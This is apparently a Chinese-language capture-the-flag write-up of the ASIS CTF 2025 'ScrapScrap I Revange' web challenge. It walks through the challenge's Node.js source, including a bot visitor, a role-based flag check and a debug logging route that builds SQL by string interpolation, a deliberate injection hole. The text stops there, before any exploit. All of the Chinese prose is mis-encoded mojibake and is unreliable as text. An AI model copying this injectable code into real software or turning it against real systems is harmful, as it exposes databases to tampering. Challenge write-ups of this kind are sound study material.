<div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
<details class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block" id="TOCView" open="">
<summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
<div class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<nav id="TableOfContents">
<ul>
<li><a href="#ç®€å•ä¸€éæµç¨‹">ç®€å•ä¸€éæµç¨‹</a></li>
<li><a href="#ç»†ç»†æçœ‹">ç»†ç»†æçœ‹</a></li>
<li><a href="#åˆ©ç”¨">åˆ©ç”¨</a>
<ul>
<li><a href="#csrf">CSRFï¼Ÿ</a></li>
<li><a href="#xss-to-sql-injection">Xss To Sql Injection</a>
<ul>
<li><a href="#å…³äºä¸€ä¸ªtextcontentçš„trick">å…³äºä¸€ä¸ªtextContentçš„trick</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#æœ¬é¢˜å‚è€ƒé“¾æ¥">æœ¬é¢˜å‚è€ƒé“¾æ¥</a></li>
</ul>
<ul>
<li><a href="#strict-mode">strict mode?</a></li>
<li><a href="#dom-clobbering-gadgeté“¾">DOM-Clobbering gadgeté“¾</a></li>
<li><a href="#åˆ©ç”¨-1">åˆ©ç”¨</a></li>
<li><a href="#xss-gadget">XSS gadget</a></li>
</ul>
</nav>
</div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
<summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
<div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<nav id="TableOfContents">
<ul>
<li><a href="#ç®€å•ä¸€éæµç¨‹">ç®€å•ä¸€éæµç¨‹</a></li>
<li><a href="#ç»†ç»†æçœ‹">ç»†ç»†æçœ‹</a></li>
<li><a href="#åˆ©ç”¨">åˆ©ç”¨</a>
<ul>
<li><a href="#csrf">CSRFï¼Ÿ</a></li>
<li><a href="#xss-to-sql-injection">Xss To Sql Injection</a>
<ul>
<li><a href="#å…³äºä¸€ä¸ªtextcontentçš„trick">å…³äºä¸€ä¸ªtextContentçš„trick</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#æœ¬é¢˜å‚è€ƒé“¾æ¥">æœ¬é¢˜å‚è€ƒé“¾æ¥</a></li>
</ul>
<ul>
<li><a href="#strict-mode">strict mode?</a></li>
<li><a href="#dom-clobbering-gadgeté“¾">DOM-Clobbering gadgeté“¾</a></li>
<li><a href="#åˆ©ç”¨-1">åˆ©ç”¨</a></li>
<li><a href="#xss-gadget">XSS gadget</a></li>
</ul>
</nav>
</div>
</details>
<script>
  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = false
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>
</div>
</div>
<div class="min-w-0 min-h-0 max-w-fit">
<div class="article-content max-w-prose mb-20">
<p>æœ¬æ¥æƒ³å¤ç°hitconè¿˜æœ‰TFC CTFçš„ï¼Œå¥ˆä½•ç¯å¢ƒä¸€ç›´è·‘ä¸å‡ºæ¥ï¼Œçº¢é—®äº†ï¼Œæ¢æˆäº†æœ€è¿‘ä¸€åœºRatingæ¯”è¾ƒé«˜çš„æ¯”èµ›</p>
<h1 class="relative group">ScrapScrap I Revange 
    <div class="anchor" id="scrapscrap-i-revange"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#scrapscrap-i-revange">#</a>
</span>
</h1>
<pre tabindex="0"><code>A web service, http://91.107.176.228:3000, that allows users to scrape websites, but only offers demo accounts that check whether you can be scraped.

If you want to enjoy the service 100%, find a way to get a user account.

Download the attachment!

Thanks to Worty as author! ğŸ˜Š
</code></pre><p>è¿™é“é¢˜çš„åŸé¢˜è¢«éé¢„æœŸäº†ï¼Œå¤ªç®€å•äº†å°±ä¸çœ‹äº†å› ä¸ºä¸æ˜¯æ­£å¸¸æ±‚è§£çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›´æ¥çœ‹revangeå§ã€‚</p>
<h2 class="relative group">ç®€å•ä¸€éæµç¨‹ 
    <div class="anchor" id="ç®€å•ä¸€éæµç¨‹"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%ae%80%e5%8d%95%e4%b8%80%e9%81%8d%e6%b5%81%e7%a8%8b">#</a>
</span>
</h2>
<p>è¿›æ¥éšä¾¿åˆ›å»ºä¸€ä¸ªè´¦å·å…ˆ







<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/1.png"/>
</figure>

è¯´æ˜¯éšä¾¿æµ‹è¯•äº†baidu.comï¼Œçœ‹è§è¿›è¡Œäº†ä¸¤ä¸ªè¯·æ±‚







<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/2.png"/>
</figure>

çœ‹ä¸€ä¸‹åç«¯åšäº†ä»€ä¹ˆäº‹æƒ…å§
çœ‹åˆ°checker.js</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/visit'</span><span class="p">,</span> <span class="nx">requireAuth</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">url</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">url</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">"http://"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">url</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">"https://"</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">flash</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="s1">'error'</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Invalid URL.'</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">await</span> <span class="nx">visitUserWebsite</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">data_dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">flash</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="s1">'success'</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Your website can definitely be scrap, be careful...'</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">flash</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="s1">'error'</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="sb">`An error occured.`</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">'/checker'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>èµ°åˆ°botï¼š</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"[BOT] - Bot is login into the app..."</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s2">"http://localhost:3000/login"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">waitForSelector</span><span class="p">(</span><span class="s2">"[name=password]"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s2">"[name=username]"</span><span class="p">,</span> <span class="nx">bot_username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s2">"[name=password]"</span><span class="p">,</span> <span class="nx">bot_pwd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">keyboard</span><span class="p">.</span><span class="nx">press</span><span class="p">(</span><span class="s2">"Enter"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"[BOT] - Bot logged in !"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">......</span>
</span></span><span class="line"><span class="cl"><span class="p">......</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">targetUrl</span><span class="p">);</span>
</span></span></code></pre></div><p>å…¶å®å°±ç™»å½•äº†ä¹‹åå¸¦ç€è‡ªå·±çš„cookieå»è®¿é—®ä¼ è¿›æ¥çš„urlè€Œå·²</p>
<h2 class="relative group">ç»†ç»†æçœ‹ 
    <div class="anchor" id="ç»†ç»†æçœ‹"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%bb%86%e7%bb%86%e6%9e%90%e7%9c%8b">#</a>
</span>
</h2>
<p>æˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸‹flagä¼šå‡ºç°çš„åœ°æ–¹
scrap.ejs</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="err">&lt;</span>% if (user.username != "superbot") { %&gt;
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Goodjob, the flag is: ASIS{FAKE_FLAG1}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">&lt;</span>% } else { %&gt;
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Welcome owner :heart:<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="err">&lt;</span>% } %&gt;
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Scrapper<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"/scrap/run"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">class</span><span class="o">=</span><span class="s">"card"</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Website you want to scrap
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"url"</span> <span class="na">type</span><span class="o">=</span><span class="s">"url"</span> <span class="na">required</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"https://exemple.com"</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span><span class="p">&gt;</span>Scrap scrap scrap !<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>å³å½“ç”¨æˆ·èƒ½è®¿é—®åˆ°scrapä»¥åŠusernameä¸ä¸ºsuperbotçš„æƒ…å†µä¸‹é¢æ‰å¯ä»¥å¾—åˆ°flag
é¦–å…ˆæ˜¯å“ªä¸ªåœ°æ–¹æ¸²æŸ“äº†scrap.ejs
/routes/scraper.js</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-JS" data-lang="JS"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nx">requireAuth</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">'scrap'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>é‚£ä¹ˆè¿™ä¸ªé€»è¾‘æ˜¯ä¸æ˜¯åªè¦æˆ‘æ³¨å†Œä¸€ä¸ªæ™®é€šçš„ç”¨æˆ·å°±å¯ä»¥ç›´æ¥è®¿é—®å¾—åˆ°flagäº†ï¼Ÿ
æ­å–œä½ ä½ è§£å‡ºæ¥äº†ScrapScrap I
æˆ‘ä»¬è¿˜è¦æ³¨æ„ä¸€ä¸ªåœ°æ–¹
app.js</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">'/scrap'</span><span class="p">,</span> <span class="nx">requireUser</span><span class="p">,</span> <span class="nx">scrapRouter</span><span class="p">);</span>
</span></span></code></pre></div><p>middleware</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">requireUser</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">flash</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="s1">'error'</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Please log in.'</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span> <span class="o">!=</span> <span class="s2">"user"</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">flash</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">flash</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">type</span><span class="o">:</span> <span class="s1">'error'</span><span class="p">,</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">'Unauthorized.'</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">'/checker'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nx">next</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>éœ€è¦ä½ çš„roleä¸ºuseræ‰å¯ä»¥è¿™æ ·å­å¾—åˆ°flagï¼Œé‚£ä¹ˆå…¶å®æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œæˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬çš„roleå˜æˆuserç„¶åè®¿é—®/scrapå°±èƒ½å¾—åˆ°flagäº†ï¼</p>
<p>è¿™ä¸ªæ—¶å€™å°±è¦çœ‹æˆ‘ä»¬æ³¨å†Œçš„æ—¶å€™é»˜è®¤çš„user.roleæ˜¯ä»€ä¹ˆäº†</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">initDb</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">await</span> <span class="nx">getDb</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">await</span> <span class="nx">exec</span><span class="p">(</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">    PRAGMA foreign_keys = ON;
</span></span></span><span class="line"><span class="cl"><span class="sb">    CREATE TABLE IF NOT EXISTS users (
</span></span></span><span class="line"><span class="cl"><span class="sb">      id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="sb">      username TEXT NOT NULL UNIQUE,
</span></span></span><span class="line"><span class="cl"><span class="sb">      password TEXT NOT NULL,
</span></span></span><span class="line"><span class="cl"><span class="sb">      data_dir TEXT NOT NULL UNIQUE CHECK(length(data_dir)=8),
</span></span></span><span class="line"><span class="cl"><span class="sb">      scrap_dir TEXT NOT NULL UNIQUE,
</span></span></span><span class="line"><span class="cl"><span class="sb">      role TEXT NOT NULL DEFAULT 'demo'
</span></span></span><span class="line"><span class="cl"><span class="sb">    );
</span></span></span><span class="line"><span class="cl"><span class="sb">    CREATE TABLE IF NOT EXISTS logs (
</span></span></span><span class="line"><span class="cl"><span class="sb">      entry TEXT NOT NULL
</span></span></span><span class="line"><span class="cl"><span class="sb">    );
</span></span></span><span class="line"><span class="cl"><span class="sb">    CREATE TRIGGER IF NOT EXISTS users_immutable_dirs
</span></span></span><span class="line"><span class="cl"><span class="sb">    BEFORE UPDATE ON users
</span></span></span><span class="line"><span class="cl"><span class="sb">    FOR EACH ROW
</span></span></span><span class="line"><span class="cl"><span class="sb">    WHEN NEW.data_dir IS NOT OLD.data_dir OR NEW.scrap_dir IS NOT OLD.scrap_dir
</span></span></span><span class="line"><span class="cl"><span class="sb">    BEGIN
</span></span></span><span class="line"><span class="cl"><span class="sb">      SELECT RAISE(ABORT, 'data_dir and scrap_dir are immutable');
</span></span></span><span class="line"><span class="cl"><span class="sb">    END;
</span></span></span><span class="line"><span class="cl"><span class="sb">  `</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">bot_username</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BOT_USERNAME</span> <span class="o">||</span> <span class="s1">'superbot'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">salt</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">bcrypt</span><span class="p">.</span><span class="nx">genSalt</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">bot_pwd</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">bcrypt</span><span class="p">.</span><span class="nx">hash</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BOT_PWD</span> <span class="o">||</span> <span class="s1">'superbot'</span><span class="p">,</span> <span class="nx">salt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">await</span> <span class="nx">createUser</span><span class="p">(</span><span class="nx">bot_username</span><span class="p">,</span> <span class="nx">bot_pwd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">await</span> <span class="nx">database</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">    UPDATE users SET role='user' WHERE id=1;
</span></span></span><span class="line"><span class="cl"><span class="sb">  `</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°é»˜è®¤ç”¨æˆ·roleä¸ºâ€™demoâ€™ç„¶åsuperbotçš„roleä¸ºâ€™userâ€™
é‚£ä¹ˆç°åœ¨å…³äºroleçš„æ•°æ®éƒ½å†™åœ¨æ•°æ®ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å»å¯»æ‰¾æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹å¯ä»¥åˆ©ç”¨
å¹¸è¿çš„æ˜¯ï¼š/routes/auth.js</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/debug/create_log'</span><span class="p">,</span> <span class="nx">requireAuth</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span> <span class="o">===</span> <span class="s2">"user"</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//rework this with the new sequelize schema
</span></span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">log</span> <span class="o">!==</span> <span class="kc">undefined</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'-'</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">log</span> <span class="o">===</span> <span class="s1">'string'</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">database</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">          INSERT INTO logs
</span></span></span><span class="line"><span class="cl"><span class="sb">          VALUES('</span><span class="si">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">log</span><span class="si">}</span><span class="sb">');
</span></span></span><span class="line"><span class="cl"><span class="sb">          SELECT *
</span></span></span><span class="line"><span class="cl"><span class="sb">          FROM logs
</span></span></span><span class="line"><span class="cl"><span class="sb">          WHERE entry = '</span><span class="si">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">log</span><span class="si">}</span><span class="sb">'
</span></span></span><span class="line"><span class="cl"><span class="sb">          LIMIT 1;
</span></span></span><span class="line"><span class="cl"><span class="sb">        `</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">'/'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">'/checker'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
